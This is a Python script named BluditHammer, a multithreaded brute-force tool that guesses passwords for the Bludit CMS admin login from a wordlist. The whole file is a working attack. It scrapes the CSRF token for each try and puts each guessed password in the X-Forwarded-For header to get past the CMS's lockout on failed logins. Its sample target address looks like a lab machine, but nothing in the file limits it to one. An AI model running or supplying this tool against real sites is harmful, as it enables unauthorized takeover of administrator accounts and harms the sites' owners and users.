#!/usr/bin/env python3

import re

import requests

import concurrent.futures

import argparse



# Define an ASCII art representation of a hammer

banner = r'''

       T                                    \`.    T

       |    T     .--------------.___________) \   |    T

       !    |     |//////////////|___________[ ]   !  T |

            !     `--------------'           )_(      | |

            				                 |_|      |

          BluditHammer: By D3ndr1t30x 

'''



def check_password(host, username, num_threads, error_log_file, wordlist_file):

    login_url = host + '/admin/login'

    with open(wordlist_file, 'r') as f:

        wordlist = [x.strip() for x in f.readlines()]



    # Shared flag to signal other threads to stop when a valid password is found

    success_flag = False



    def attempt_password(password):

        nonlocal success_flag  # Access the shared flag

        

        if not success_flag:  # Only continue if no other thread has found a valid password

            session = requests.Session()

            login_page = session.get(login_url)

            csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)



            print(f'[*] Trying: {username}:{password}')



            headers = {

                'X-Forwarded-For': password,

                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',

                'Referer': login_url

            }



            data = {

                'tokenCSRF': csrf_token,

                'username': username,

                'password': password,

                'save': ''

            }



            login_result = session.post(login_url, headers=headers, data=data, allow_redirects=False)



            if 'location' in login_result.headers:

                if '/admin/dashboard' in login_result.headers['location']:

                    success_flag = True  # Set the flag to signal other threads to stop

                    print(f'SUCCESS: Password found! Use {username}:{password} to login.')

                    return password



            # Log failed attempts in the error log file

            with open(error_log_file, 'a') as error_log:

                error_log.write(f'Failed attempt: {username}:{password}\n')



        return None



    # Using concurrent.futures to parallelize the brute-force attempts

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:

        results = executor.map(attempt_password, wordlist)



    # Check if any valid passwords were found

    valid_passwords = [result for result in results if result is not None]



    if valid_passwords:

        print(f'Successful passwords found: {valid_passwords}')

    else:

        print('No valid passwords found.')



def main():

    # Print the banner when the script starts

    print(banner)

    

    parser = argparse.ArgumentParser(description='BluditHammer - Bludit CMS Brute Force Script')

    parser.add_argument('host', help='Target URL (e.g., http://10.10.10.191)')

    parser.add_argument('username', help='Username to brute force')

    parser.add_argument('-t', '--threads', type=int, default=4, help='Number of threads (default: 4)')

    parser.add_argument('-e', '--error-log', default='error_logs.txt', help='Error log file name (default: error_logs.txt)')

    parser.add_argument('wordlist', help='Path to the wordlist file')



    args = parser.parse_args()

    check_password(args.host, args.username, args.threads, args.error_log, args.wordlist)



if __name__ == '__main__':

    main()

